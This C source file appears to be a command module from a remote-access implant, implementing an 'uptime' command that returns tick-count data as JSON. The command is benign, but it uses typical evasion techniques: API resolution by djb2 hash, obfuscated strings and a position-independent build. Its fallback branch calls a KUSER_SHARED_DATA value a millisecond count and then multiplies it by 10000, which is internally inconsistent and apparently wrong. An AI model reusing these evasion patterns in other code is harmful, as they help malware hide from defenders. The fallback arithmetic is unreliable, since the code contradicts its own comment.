#include "config.h"
#ifdef INCLUDE_CMD_UPTIME

#include "commands.h"
#include "json_out.h"

typedef ULONGLONG (WINAPI *fn_GetTickCount64_t)(void);


// Exact 64/32 division without __udivdi3 (PIC build links no libgcc; plain /
// and % on unsigned __int64 fail to link on x86). Shift-subtract, 64 rounds,
// runs a handful of times per command - plenty fast here.
static unsigned __int64 es_u64_div(unsigned __int64 v, DWORD d, DWORD* rem) {
    unsigned __int64 q = 0, r = 0;
    for (int i = 63; i >= 0; i--) {
        r = (r << 1) | ((v >> i) & 1ULL);
        if (r >= (unsigned __int64)d) { r -= d; q |= (1ULL << i); }
    }
    if (rem) *rem = (DWORD)r;
    return q;
}

VOID cmd_uptime(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_k32, "kernel32.dll");
    HMODULE h_k32 = inst->Win32.LoadLibraryA(_k32);
    fn_GetTickCount64_t pGTC64 = h_k32 ?
        (fn_GetTickCount64_t)resolve_function(h_k32, hash_string_djb2(XSTR("GetTickCount64"))) : NULL;

    ULONGLONG ms = 0;
    if (pGTC64) {
        ms = pGTC64();
    } else {
        // fallback: KUSER_SHARED_DATA tick count (DWORD, wraps at 49 days)
        DWORD lo = *(DWORD*)0x7FFE0000;
        ms = (ULONGLONG)lo * 10000ULL;
    }

    DWORD secs = (DWORD)es_u64_div(ms, 1000, NULL);
    DWORD days = secs / 86400;
    DWORD hours = (secs % 86400) / 3600;
    DWORD mins = (secs % 3600) / 60;
    DWORD secs2 = secs % 60;

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"uptime_ms\":");
    j_append_u64(&jb, ms);
    j_append_raw(&jb, ",\"days\":");
    j_append_uint(&jb, days);
    j_append_raw(&jb, ",\"hours\":");
    j_append_uint(&jb, hours);
    j_append_raw(&jb, ",\"minutes\":");
    j_append_uint(&jb, mins);
    j_append_raw(&jb, ",\"seconds\":");
    j_append_uint(&jb, secs2);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
